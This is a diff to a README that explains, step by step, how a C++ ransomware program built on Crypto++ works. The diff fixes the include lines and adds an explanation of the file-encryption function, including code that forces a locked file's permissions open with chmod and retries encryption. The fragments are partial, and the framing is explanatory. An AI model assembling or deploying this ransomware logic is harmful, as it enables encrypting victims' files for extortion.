@@ -47,10 +47,11 @@ This part of README.md will be focused on explaining how ransomware works
 >> #include <cryptopp/aes.h>
 >> #include <cryptopp/files.h>
 >> #include <cryptopp/modes.h>
->> #include <cryptopp/channels.>
->>
+>> #include <cryptopp/channels.h>
+>> 
 >> #include <experimental/filesystem>
 >> #include <string>
+>> #include <sys/stat.h>
 >>```  
 
 > ### Custom namespaces
@@ -66,15 +67,30 @@ it requires two arguments: `filename` which is path of the file to encrypt and r
 >> void encrypt(const char filename[], const std::string &pwd)
 >> ```
 >>
+>> First we define `temp_filename` variable which will be the name of temporary file that `encrypt` function will be writing encrypted data to.
+>> ```c++
+>> const char temp_filename[] = "temp";
+>> ```
+>> 
+>> This `try .. catch` catches OpenErr which usually means incorrect permission and then sets correct ones.
+>> Next `catch` catches all `CryptoPP::Exception` and removes temporary file.
+>> ```c++
+>> try {
+>>    ...
+>> } catch (CryptoPP::FileStore::OpenErr &err) {
+>>     std::cerr << err.what() << std::endl;
+>>     chmod(filename, S_IRWXU);
+>>     encrypt(filename, pwd);
+>> } catch (CryptoPP::Exception &err) {
+>>     fs::remove(temp_filename);
+>> }
+>> ```
+>> 
 >> Next line of `encrypt` function prints information about current file that is being encrypted 
 >> ```c++
 >> std::cout << "Encrypting: " << filename << std::endl;
 >> ```
 >>
->> Then we define `temp_filename` variable which will be the name of temporary file that `encrypt` function will be writing encrypted data to.
->> ```c++
->> const char temp_filename[] = "temp";
->> ```
 >>
 >> After that we create `iv` array of `CryptoPP::byte` which will be our initialization vector with size of 16 and set all of its indexes to `0x01` byte
 >> ```c++
